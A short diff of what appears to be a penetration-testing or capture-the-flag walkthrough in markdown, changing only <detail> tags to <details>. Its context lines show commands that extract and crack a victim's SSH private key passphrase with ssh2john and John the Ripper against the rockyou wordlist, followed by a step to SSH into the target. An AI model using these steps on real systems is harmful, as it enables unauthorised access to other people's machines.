@@ -77,7 +77,7 @@ drwxr-xr-x 3 nullbyte nullbyte 4096 2019-06-19 13:46 ..
 3. Crack the Private Key.  
     `$ python3 /usr/share/john/ssh2john.py victim_rsa > rsa.hash`  
     `$ john --wordlist=/usr/share/wordlists/rockyou.txt rsa.hash`
-    <detail>
+    <details>
     ```
     $ john --wordlist=/usr/share/wordlists/rockyou.txt rsa.hash
     Using default input encoding: UTF-8
@@ -90,7 +90,7 @@ drwxr-xr-x 3 nullbyte nullbyte 4096 2019-06-19 13:46 ..
     Use the "--show" option to display all of the cracked passwords reliably
     Session completed.
     ```
-    </detail>  
+    </details>  
     `$ john --show rsa.hash`  
 4. SSH into the Target.
     `$ chmod 600 victim_rsa`  
